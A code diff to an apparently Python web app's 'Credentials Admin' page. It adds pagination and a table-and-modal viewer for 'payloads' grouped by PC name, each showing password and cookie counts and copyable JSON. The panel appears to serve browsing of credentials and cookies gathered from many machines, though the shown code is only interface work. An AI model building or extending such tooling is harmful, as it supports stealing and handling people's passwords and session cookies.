@@ -20,9 +20,25 @@ async def admin_page() -> HTMLResponse:
 async def admin_list_payloads(
     environment: str = Query(default="production"),
     pc_name: str | None = Query(default=None),
+    page: int = Query(default=1, ge=1),
+    page_size: int = Query(default=20, ge=1, le=100),
 ) -> JSONResponse:
-    items = list_payloads(environment=environment or None, pc_name=pc_name or None)
-    return JSONResponse({"items": items, "count": len(items)})
+    items, total = list_payloads(
+        environment=environment or None,
+        pc_name=pc_name or None,
+        page=page,
+        page_size=page_size,
+    )
+    total_pages = (total + page_size - 1) // page_size if total else 0
+    return JSONResponse(
+        {
+            "items": items,
+            "total": total,
+            "page": page,
+            "page_size": page_size,
+            "total_pages": total_pages,
+        }
+    )
 
 
 @router.get("/admin-credentials/payloads/{payload_id}")
@@ -64,26 +80,12 @@ _ADMIN_HTML = """<!DOCTYPE html>
       background: #151820;
     }
     header h1 { margin: 0; font-size: 1.1rem; font-weight: 600; }
-    .layout {
-      display: grid;
-      grid-template-columns: 340px 1fr;
-      min-height: calc(100vh - 53px);
-    }
-    @media (max-width: 900px) {
-      .layout { grid-template-columns: 1fr; }
-    }
-    .sidebar {
-      border-right: 1px solid #2a2f3a;
-      padding: 1rem;
-      overflow: auto;
-    }
-    .main {
-      padding: 1rem 1.25rem;
-      overflow: auto;
-    }
-    .filters {
-      display: grid;
+    .container { padding: 1rem 1.25rem 2rem; max-width: 1200px; margin: 0 auto; }
+    .toolbar {
+      display: flex;
+      flex-wrap: wrap;
       gap: 0.75rem;
+      align-items: end;
       margin-bottom: 1rem;
     }
     label {
@@ -91,9 +93,9 @@ _ADMIN_HTML = """<!DOCTYPE html>
       gap: 0.35rem;
       font-size: 0.8rem;
       color: #9aa3b2;
+      min-width: 160px;
     }
-    select, input {
-      width: 100%;
+    select {
       padding: 0.55rem 0.65rem;
       border: 1px solid #2a2f3a;
       border-radius: 6px;
@@ -113,32 +115,83 @@ _ADMIN_HTML = """<!DOCTYPE html>
     button:hover { background: #252d3f; }
     button.primary { background: #2563eb; border-color: #2563eb; }
     button.primary:hover { background: #1d4ed8; }
-    .list { display: grid; gap: 0.5rem; }
-    .item {
-      padding: 0.75rem;
+    button:disabled { opacity: 0.45; cursor: not-allowed; }
+    .table-wrap {
       border: 1px solid #2a2f3a;
       border-radius: 8px;
+      overflow: hidden;
       background: #151820;
-      cursor: pointer;
     }
-    .item:hover, .item.active { border-color: #2563eb; background: #1a2030; }
-    .item-title { font-weight: 600; font-size: 0.92rem; }
-    .item-meta { font-size: 0.78rem; color: #9aa3b2; margin-top: 0.25rem; }
-    .empty {
+    table { width: 100%; border-collapse: collapse; }
+    th, td {
+      padding: 0.75rem 1rem;
+      text-align: left;
+      border-bottom: 1px solid #2a2f3a;
+      font-size: 0.88rem;
+    }
+    th {
+      background: #1a2030;
       color: #9aa3b2;
-      font-size: 0.9rem;
-      padding: 1rem 0;
+      font-size: 0.78rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.03em;
     }
-    .viewer-header {
+    tr:last-child td { border-bottom: none; }
+    tbody tr { cursor: pointer; }
+    tbody tr:hover { background: #1a2030; }
+    .mono { font-family: ui-monospace, monospace; font-size: 0.82rem; }
+    .empty {
+      padding: 2rem;
+      text-align: center;
+      color: #9aa3b2;
+    }
+    .pagination {
       display: flex;
       align-items: center;
       justify-content: space-between;
       gap: 0.75rem;
-      margin-bottom: 0.75rem;
+      margin-top: 1rem;
       flex-wrap: wrap;
     }
-    .viewer-title { font-size: 0.95rem; font-weight: 600; }
-    .viewer-actions { display: flex; gap: 0.5rem; }
+    .pagination-info { font-size: 0.85rem; color: #9aa3b2; }
+    .pagination-controls { display: flex; gap: 0.5rem; align-items: center; }
+    .page-indicator { font-size: 0.85rem; min-width: 100px; text-align: center; }
+    .modal-backdrop {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.65);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1rem;
+      z-index: 100;
+    }
+    .modal-backdrop[hidden] { display: none; }
+    .modal {
+      width: min(900px, 100%);
+      max-height: 90vh;
+      background: #151820;
+      border: 1px solid #2a2f3a;
+      border-radius: 10px;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+    .modal-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 0.75rem;
+      padding: 1rem 1.25rem;
+      border-bottom: 1px solid #2a2f3a;
+    }
+    .modal-title { font-weight: 600; font-size: 0.95rem; }
+    .modal-actions { display: flex; gap: 0.5rem; }
+    .modal-body {
+      padding: 1rem 1.25rem 1.25rem;
+      overflow: auto;
+    }
     pre {
       margin: 0;
       padding: 1rem;
@@ -146,73 +199,104 @@ _ADMIN_HTML = """<!DOCTYPE html>
       border-radius: 8px;
       background: #0b0d11;
       overflow: auto;
-      max-height: calc(100vh - 160px);
+      max-height: calc(90vh - 140px);
       font-size: 0.78rem;
       line-height: 1.45;
       white-space: pre-wrap;
       word-break: break-word;
     }
-    .status {
-      font-size: 0.8rem;
-      color: #22c55e;
-      min-height: 1rem;
-    }
-    .placeholder {
-      color: #9aa3b2;
-      padding: 2rem 0;
-      text-align: center;
-    }
+    .status { font-size: 0.8rem; color: #22c55e; margin-top: 0.5rem; min-height: 1rem; }
   </style>
 </head>
 <body>
   <header><h1>Credentials Admin</h1></header>
-  <div class="layout">
-    <aside class="sidebar">
-      <div class="filters">
-        <label>
-          Environment
-          <select id="env-filter"></select>
-        </label>
-        <label>
-          PC
-          <select id="pc-filter">
-            <option value="">All</option>
-          </select>
-        </label>
-        <button type="button" id="refresh-btn">Refresh</button>
+  <div class="container">
+    <div class="toolbar">
+      <label>
+        Environment
+        <select id="env-filter"></select>
+      </label>
+      <label>
+        PC
+        <select id="pc-filter">
+          <option value="">All</option>
+        </select>
+      </label>
+      <button type="button" id="refresh-btn">Refresh</button>
+    </div>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>ID</th>
+            <th>PC</th>
+            <th>Environment</th>
+            <th>Datetime</th>
+            <th>Passwords</th>
+            <th>Cookies</th>
+          </tr>
+        </thead>
+        <tbody id="table-body"></tbody>
+      </table>
+      <div id="table-empty" class="empty" hidden>No records found.</div>
+    </div>
+
+    <div class="pagination">
+      <div class="pagination-info" id="pagination-info"></div>
+      <div class="pagination-controls">
+        <button type="button" id="prev-btn">Previous</button>
+        <span class="page-indicator" id="page-indicator"></span>
+        <button type="button" id="next-btn">Next</button>
       </div>
-      <div id="list" class="list"></div>
-      <div id="list-empty" class="empty" hidden>No records found.</div>
-    </aside>
-    <section class="main">
-      <div id="viewer-placeholder" class="placeholder">Select a record to view JSON.</div>
-      <div id="viewer" hidden>
-        <div class="viewer-header">
-          <div class="viewer-title" id="viewer-title"></div>
-          <div class="viewer-actions">
-            <button type="button" id="copy-btn" class="primary">Copy JSON</button>
-          </div>
-        </div>
-        <div class="status" id="copy-status"></div>
-        <pre id="json-view"></pre>
-      </div>
-    </section>
+    </div>
   </div>
+
+  <div id="modal-backdrop" class="modal-backdrop" hidden>
+    <div class="modal" role="dialog" aria-modal="true">
+      <div class="modal-header">
+        <div class="modal-title" id="modal-title"></div>
+        <div class="modal-actions">
+          <button type="button" id="copy-btn" class="primary">Copy JSON</button>
+          <button type="button" id="close-btn">Close</button>
+        </div>
+      </div>
+      <div class="modal-body">
+        <pre id="json-view"></pre>
+        <div class="status" id="copy-status"></div>
+      </div>
+    </div>
+  </div>
+
   <script>
     const envFilter = document.getElementById("env-filter");
     const pcFilter = document.getElementById("pc-filter");
-    const listEl = document.getElementById("list");
-    const listEmpty = document.getElementById("list-empty");
-    const viewer = document.getElementById("viewer");
-    const viewerPlaceholder = document.getElementById("viewer-placeholder");
-    const viewerTitle = document.getElementById("viewer-title");
+    const tableBody = document.getElementById("table-body");
+    const tableEmpty = document.getElementById("table-empty");
+    const paginationInfo = document.getElementById("pagination-info");
+    const pageIndicator = document.getElementById("page-indicator");
+    const prevBtn = document.getElementById("prev-btn");
+    const nextBtn = document.getElementById("next-btn");
+    const refreshBtn = document.getElementById("refresh-btn");
+    const modalBackdrop = document.getElementById("modal-backdrop");
+    const modalTitle = document.getElementById("modal-title");
     const jsonView = document.getElementById("json-view");
     const copyBtn = document.getElementById("copy-btn");
+    const closeBtn = document.getElementById("close-btn");
     const copyStatus = document.getElementById("copy-status");
-    const refreshBtn = document.getElementById("refresh-btn");
 
+    const PAGE_SIZE = 20;
+    let currentPage = 1;
+    let totalPages = 0;
     let currentJson = "";
-    let selectedId = null;
+
+    function escapeHtml(value) {
+      return String(value)
+        .replaceAll("&", "&amp;")
+        .replaceAll("<", "&lt;")
+        .replaceAll(">", "&gt;")
+        .replaceAll('"', "&quot;");
+    }
 
     async function loadFilters() {
       const env = envFilter.value || "production";
@@ -241,47 +325,60 @@ _ADMIN_HTML = """<!DOCTYPE html>
       pcFilter.value = [...pcFilter.options].some(o => o.value === prevPc) ? prevPc : "";
     }
 
-    async function loadList() {
+    async function loadList(page = currentPage) {
+      currentPage = page;
       const params = new URLSearchParams();
       params.set("environment", envFilter.value || "production");
+      params.set("page", String(currentPage));
+      params.set("page_size", String(PAGE_SIZE));
       if (pcFilter.value) params.set("pc_name", pcFilter.value);
 
       const res = await fetch(`/admin-credentials/payloads?${params}`);
       const data = await res.json();
-      listEl.innerHTML = "";
-      listEmpty.hidden = data.count > 0;
+
+      totalPages = data.total_pages;
+      tableBody.innerHTML = "";
+      tableEmpty.hidden = data.total > 0;
 
       for (const item of data.items) {
-        const el = document.createElement("div");
-        el.className = "item" + (item.id === selectedId ? " active" : "");
-        el.dataset.id = item.id;
-        el.innerHTML = `
-          <div class="item-title">${item.pc_name}</div>
-          <div class="item-meta">
-            #${item.id} · ${item.environment}<br>
-            ${item.datetime}<br>
-            ${item.password_count ?? 0} passwords · ${item.cookie_count ?? 0} cookies
-          </div>`;
-        el.addEventListener("click", () => selectItem(item.id));
-        listEl.appendChild(el);
+        const tr = document.createElement("tr");
+        tr.innerHTML = `
+          <td class="mono">#${item.id}</td>
+          <td>${escapeHtml(item.pc_name)}</td>
+          <td>${escapeHtml(item.environment)}</td>
+          <td class="mono">${escapeHtml(item.datetime)}</td>
+          <td>${item.password_count ?? 0}</td>
+          <td>${item.cookie_count ?? 0}</td>`;
+        tr.addEventListener("click", () => openModal(item.id));
+        tableBody.appendChild(tr);
       }
+
+      const start = data.total ? (data.page - 1) * data.page_size + 1 : 0;
+      const end = Math.min(data.page * data.page_size, data.total);
+      paginationInfo.textContent = data.total
+        ? `Showing ${start}–${end} of ${data.total}`
+        : "No results";
+      pageIndicator.textContent = data.total ? `Page ${data.page} of ${data.total_pages}` : "";
+      prevBtn.disabled = data.page <= 1;
+      nextBtn.disabled = data.page >= data.total_pages;
     }
 
-    async function selectItem(id) {
-      selectedId = id;
+    async function openModal(id) {
       copyStatus.textContent = "";
-      for (const el of listEl.querySelectorAll(".item")) {
-        el.classList.toggle("active", Number(el.dataset.id) === id);
-      }
-
       const res = await fetch(`/admin-credentials/payloads/${id}`);
       if (!res.ok) return;
       const data = await res.json();
       currentJson = JSON.stringify(data.content, null, 2);
-      viewerTitle.textContent = `${data.pc_name} · ${data.datetime}`;
+      modalTitle.textContent = `${data.pc_name} · ${data.datetime}`;
       jsonView.textContent = currentJson;
-      viewer.hidden = false;
-      viewerPlaceholder.hidden = true;
+      modalBackdrop.hidden = false;
+      document.body.style.overflow = "hidden";
+    }
+
+    function closeModal() {
+      modalBackdrop.hidden = true;
+      document.body.style.overflow = "";
+      copyStatus.textContent = "";
     }
 
     async function copyJson() {
@@ -303,19 +400,32 @@ _ADMIN_HTML = """<!DOCTYPE html>
 
     envFilter.addEventListener("change", async () => {
       await loadFilters();
-      await loadList();
+      await loadList(1);
     });
-    pcFilter.addEventListener("change", loadList);
+    pcFilter.addEventListener("change", () => loadList(1));
     refreshBtn.addEventListener("click", async () => {
       await loadFilters();
-      await loadList();
+      await loadList(1);
+    });
+    prevBtn.addEventListener("click", () => {
+      if (currentPage > 1) loadList(currentPage - 1);
+    });
+    nextBtn.addEventListener("click", () => {
+      if (currentPage < totalPages) loadList(currentPage + 1);
     });
     copyBtn.addEventListener("click", copyJson);
+    closeBtn.addEventListener("click", closeModal);
+    modalBackdrop.addEventListener("click", (e) => {
+      if (e.target === modalBackdrop) closeModal();
+    });
+    document.addEventListener("keydown", (e) => {
+      if (e.key === "Escape" && !modalBackdrop.hidden) closeModal();
+    });
 
     (async () => {
       await loadFilters();
       if (!envFilter.value) envFilter.value = "production";
-      await loadList();
+      await loadList(1);
     })();
   </script>
 </body>
